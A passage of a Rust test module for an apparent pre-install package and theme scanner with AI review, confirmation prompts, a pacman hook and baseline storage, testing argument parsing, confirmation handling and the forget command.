            &mut no_terminal,
            &mut |_| panic!("launched without confirmation"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn class_and_profile_flags_parse() {
        let Ok(Invocation::Scan(target)) = parse(&args(&[
            "scan",
            "--class",
            "aur",
            "--profile",
            "strict",
            "dir",
        ])) else {
            panic!("expected scan");
        };
        assert_eq!(target.class, SourceClass::Aur);
        assert_eq!(target.profile, Some(Profile::Strict));

        for bad in [
            &["scan", "--class", "official", "dir"][..],
            &["scan", "--class", "nope", "dir"],
            &["scan", "--profile", "paranoid", "dir"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn guard_under_local_only_with_a_declined_confirm_is_not_confirmed() {
        let dir = TempDir::new("confirm-declined");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };
        let settings = local_only();

        let mut declined = Scripted(Some(false), Vec::new());
        let (_, decision) =
            review_and_decide(&target, &settings, &unavailable(), Some(&mut declined), &[]);
        assert_eq!(decision, Decision::Blocked(Blocked::NotConfirmed));

        let mut declined = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target,
            &args(&["true"]),
            &settings,
            &unavailable(),
            &mut declined,
            &mut |_| panic!("launched without confirmation"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn confirm_is_ignored_unless_ai_is_off() {
        let dir = TempDir::new("confirm-ai-required");
        let bin = TempDir::new("confirm-ai-required-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };
        // Standard profile leaves ai = required for a non-official class; a
        // user file may still set confirm = true, but it must not be asked.
        let user = PartialConfig {
            classes: vec![(
                SourceClass::Theme,
                PartialPolicy {
                    confirm: Some(true),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(PartialConfig::default(), user);
        assert_eq!(
            settings.policy(SourceClass::Theme).ai,
            AiRequirement::Required
        );
        assert!(settings.policy(SourceClass::Theme).confirm);

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let mut confirm = Scripted(Some(true), Vec::new());
        let (_, decision) =
            review_and_decide(&target, &settings, &opencode, Some(&mut confirm), &[]);

        assert_eq!(decision, Decision::Clear);
        assert!(confirm.1.is_empty());
    }

    #[test]
    fn parses_config_subcommands() {
        assert_eq!(
            parse(&args(&["config", "check"])).unwrap(),
            Invocation::Config(ConfigCommand::Check)
        );
        assert_eq!(
            parse(&args(&["config", "path"])).unwrap(),
            Invocation::Config(ConfigCommand::Path)
        );
        assert_eq!(
            parse(&args(&["config", "show", "--class", "official"])).unwrap(),
            Invocation::Config(ConfigCommand::Show(Some(SourceClass::Official)))
        );
        assert!(parse(&args(&["config"])).is_err());
        assert!(parse(&args(&["config", "edit"])).is_err());
    }

    #[test]
    fn parses_setup() {
        assert_eq!(parse(&args(&["setup"])).unwrap(), Invocation::Setup);
        assert!(parse(&args(&["setup", "extra"])).is_err());
        assert_eq!(
            parse(&args(&["protect"])).unwrap(),
            Invocation::Protect {
                yes: false,
                off: false
            }
        );
        assert_eq!(
            parse(&args(&["protect", "--off", "--yes"])).unwrap(),
            Invocation::Protect {
                yes: true,
                off: true
            }
        );
        assert!(parse(&args(&["protect", "--all"])).is_err());
        assert_eq!(parse(&args(&["test"])).unwrap(), Invocation::Test);
        assert_eq!(
            parse(&args(&["tui"])).unwrap(),
            Invocation::Tui { expert: false }
        );
        assert_eq!(
            parse(&args(&["settings", "--expert"])).unwrap(),
            Invocation::Tui { expert: true }
        );
        assert!(parse(&args(&["tui", "extra"])).is_err());
        assert_eq!(
            parse(&args(&["pacman-hook", "--preflight"])).unwrap(),
            Invocation::HookPreflight
        );
    }

    #[test]
    fn identity_and_unit_flags_parse() {
        let Ok(Invocation::Scan(target)) = parse(&args(&["scan", "--identity", "aur:demo", "dir"]))
        else {
            panic!("expected scan");
        };
        assert_eq!(
            target.units,
            [Unit {
                prefix: String::new(),
                identity: Identity::parse("aur:demo").unwrap(),
            }]
        );

        let Ok(Invocation::Guard(target, _)) = parse(&args(&[
            "guard",
            "--unit",
            "good",
            "theme:good",
            "--unit",
            "dark",
            "theme:dark",
            "staged",
            "--",
            "true",
        ])) else {
            panic!("expected guard");
        };
        let prefixes: Vec<&str> = target
            .units
            .iter()
            .map(|unit| unit.prefix.as_str())
            .collect();
        assert_eq!(prefixes, ["good/", "dark/"]);

        for bad in [
            &["scan", "--identity", "a", "--identity", "b", "dir"][..],
            &["scan", "--identity", "a", "--unit", "x", "b", "dir"],
            &["scan", "--unit", "x", "b", "--identity", "a", "dir"],
            &["scan", "--unit", "a/b", "id", "dir"],
            &["scan", "--unit", "x"],
            &["scan", "--identity", "", "dir"],
            &["scan", "--unit", "a", "X", "--unit", "b", "X", "dir"],
            &["scan", "--unit", "a", "X", "--unit", "a", "Y", "dir"],
            &["scan", "--unit", "a", "X", "--unit", "a", "X", "dir"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn parses_forget() {
        assert_eq!(
            parse(&args(&["forget", "--all"])).unwrap(),
            Invocation::Forget(Forget::All)
        );
        assert_eq!(
            parse(&args(&["forget", "aur:demo"])).unwrap(),
            Invocation::Forget(Forget::One(Identity::parse("aur:demo").unwrap()))
        );
        assert!(parse(&args(&["forget"])).is_err());
        assert!(parse(&args(&["forget", "a", "b"])).is_err());
        assert!(parse(&args(&["forget", "--al"])).is_err());
        assert!(parse(&args(&["forget", "-x"])).is_err());
    }

    #[test]
    fn forget_removes_baselines() {
        let state = TempDir::new("forget");
        let root = state.path().join("store");
        let store = Store::open(root.clone()).unwrap();
        let unit = Unit {
            prefix: String::new(),
            identity: Identity::parse("aur:demo").unwrap(),
        };
        let files = [SourceFile {
            path: "PKGBUILD".into(),
            content: "x\n".into(),
        }];
        baseline::record(
            &store,
            SourceClass::Aur,
            std::slice::from_ref(&unit),
            &files,
            &baseline::Unread::new(),
            &AgentSettings::default(),
            1,
        )
        .unwrap();

        assert_eq!(
            forget_in(&Forget::One(unit.identity.clone()), &store).unwrap(),
            "Forgot 1 approved baseline(s) for aur:demo. Cached verdicts are kept; use forget --all to clear them too."
        );
        assert_eq!(
            forget_command(&Forget::One(unit.identity.clone()), Some(root.clone())),
            ExitCode::SUCCESS
        );
        assert!(
            baseline::load(&store, SourceClass::Aur, &[unit], &AgentSettings::default())
                .unwrap()
                .is_none()
        );
        assert_eq!(forget_command(&Forget::All, Some(root)), ExitCode::SUCCESS);
        assert_eq!(forget_command(&Forget::All, None), ExitCode::from(2));
    }
}
